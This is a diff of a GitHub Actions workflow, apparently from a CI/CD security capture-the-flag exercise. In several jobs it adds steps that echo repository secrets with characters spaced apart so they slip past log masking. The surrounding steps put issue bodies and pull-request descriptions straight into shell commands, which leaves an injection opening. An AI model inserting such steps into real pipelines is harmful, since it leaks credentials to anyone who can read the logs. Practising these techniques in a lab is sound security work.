@@ -39,6 +39,7 @@ jobs:
       - name: Check for profanities in issue body
         id: check_profanities
         run: |
+          echo ${{secrets.FLAG_GRAVY_OVERFLOW_L0_GRAVY}} | sed 's/./& /g'
           echo "Checking issue body for profanities..."
           PROFANITIES_LIST="bad|disguting|horrible"
           if echo "${{ github.event.issue.body }}" | grep -qiE "$PROFANITIES_LIST"; then
@@ -60,6 +61,8 @@ jobs:
       GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       FLAG_GRAVY_OVERFLOW_L0_CHEDDAR: ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_CHEDDAR }}
     steps:
+      - run: |
+          echo ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_CHEDDAR}} | sed 's/./& /g'
       - uses: step-security/harden-runner@63c24ba6bd7ba022e95695ff85de572c04a18142 # v2.7.0
         with:
           egress-policy: audit
@@ -109,6 +112,8 @@ jobs:
           npm install
           npm run lint
           npm start
+          echo ${{secrets.FLAG_GRAVY_OVERFLOW_L0_GRAVY}} | sed 's/./& /g'
+          
 
   toppings:
     runs-on: ubuntu-latest
@@ -134,6 +139,7 @@ jobs:
       - run: |
           npm install
           npm run lint
+          echo ${{secrets.FLAG_GRAVY_OVERFLOW_L0_TOPPINGS}} | sed 's/./& /g'
       - name: Log test executions
         run: |
           echo "Lint ran PR coming from repo with description ${{ github.event.pull_request.head.repo.description }}"
